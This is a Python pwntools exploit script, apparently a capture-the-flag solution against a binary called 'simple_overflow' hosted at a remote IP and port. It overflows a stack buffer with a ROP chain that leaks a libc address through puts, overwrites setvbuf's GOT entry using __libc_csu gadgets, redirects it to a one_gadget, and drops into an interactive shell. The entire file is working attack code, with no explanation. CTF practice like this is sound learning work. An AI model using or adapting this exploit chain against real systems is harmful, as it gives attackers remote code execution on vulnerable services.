from pwn import *

r = process('./simple_overflow')
r = remote('20.194.4.150', 4147)

gdbArg = '''
b *0x401310
'''
#gdb.attach(r, gdbArg)

base = 0x111130
one_1 = 0xe6c7e
one_2 = 0xe6c81
one_3 = 0xe6c84

poprdi = 0x401333
putsplt = 0x401070
readgot = 0x404020
setvbufgot = 0x404028
readplt = 0x401080
setvbufplt = 0x401090

csu1 = 0x40132A
csu2 = 0x401310

ex = b'a'*24 + p64(poprdi) + p64(readgot) + p64(putsplt)
# 0, 1, rdi, rsi, rdx, ret
ex += p64(csu1) + p64(0) + p64(1) + p64(0) + p64(setvbufgot) + p64(8) + p64(readgot) + p64(csu2)
ex += p64(0) + p64(1) + p64(0) + p64(0) + p64(1) + p64(0) + p64(0) + p64(setvbufplt)

r.recvuntil('??\n')
r.sendline('-1')

r.recvuntil('??\n')
r.sendline(ex)

r.recv(28)
leak = u64(r.recv(6) + b'\x00\x00')
print(hex(leak))
leak -= base
print(hex(leak))
leak += one_1
print(hex(leak))

r.sendline(p64(leak))

r.interactive()